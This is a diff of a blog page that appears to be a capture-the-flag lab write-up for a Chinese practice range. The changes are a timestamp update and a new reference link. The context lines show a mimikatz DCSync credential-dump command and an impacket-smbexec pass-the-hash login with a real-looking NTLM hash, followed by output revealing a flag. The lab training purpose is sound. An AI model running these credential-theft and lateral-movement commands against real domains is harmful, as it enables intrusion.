@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152207156.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152207695.png">
 <meta property="article:published_time" content="2026-04-15T14:50:00.000Z">
-<meta property="article:modified_time" content="2026-04-15T15:50:52.215Z">
+<meta property="article:modified_time" content="2026-04-15T16:27:23.989Z">
 <meta property="article:author" content="sangnigege">
 <meta property="article:tag" content="春秋云镜">
 <meta name="twitter:card" content="summary_large_image">
@@ -491,7 +491,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
 
 <p>这里没成功，就不继续试了</p>
-<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><h6 id="PTH-1"><a href="#PTH-1" class="headerlink" title="?PTH"></a>?PTH</h6><p>依旧pth拿域管，出flag3</p>
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>依旧pth拿域管，出flag3。参考文章：<a target="_blank" rel="noopener" href="https://sangnigege.github.io/2026/test45/">域渗透基础 - 重庆森林不在重庆</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cobol">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26<br><br>C:\Windows\system32&gt;type c:\users\administrator\flag\flag03.txt<br>                                ___              .-.                <br>                               (   )      .-.   /    \              <br>  .--.      .--.    ___ .-.     | |_     ( __)  | .`. ;   ___  ___  <br> /    \    /    \  (   )   \   (   __)   (&#x27;&#x27;&quot;)  | |(___) (   )(   ) <br>|  .-. ;  |  .-. ;  | &#x27; .-. ;   | |       | |   | |_      | |  | |  <br>|  |(___) |  | | |  |  / (___)  | | ___   | |  (   __)    | |  | |  <br>|  |      |  |/  |  | |         | |(   )  | |   | |       | &#x27;  | |  <br>|  | ___  |  &#x27; _.&#x27;  | |         | | | |   | |   | |       &#x27;  `-&#x27; |  <br>|  &#x27;(   ) |  .&#x27;.-.  | |         | &#x27; | |   | |   | |        `.__. |  <br>&#x27;  `-&#x27; |  &#x27;  `-&#x27; /  | |         &#x27; `-&#x27; ;   | |   | |        ___ | |  <br> `.__,&#x27;    `.__.&#x27;  (___)         `.__.   (___) (___)      (   )&#x27; |  <br>                                                           ; `-&#x27; &#x27;  <br>                                                            .__.&#x27;   <br><br>      flag03: flag&#123;02c34eca-3bba-4123-95a8-05edcc4edbac&#125;<br></code></pre></td></tr></table></figure>
 
 <p>flag4同理</p>
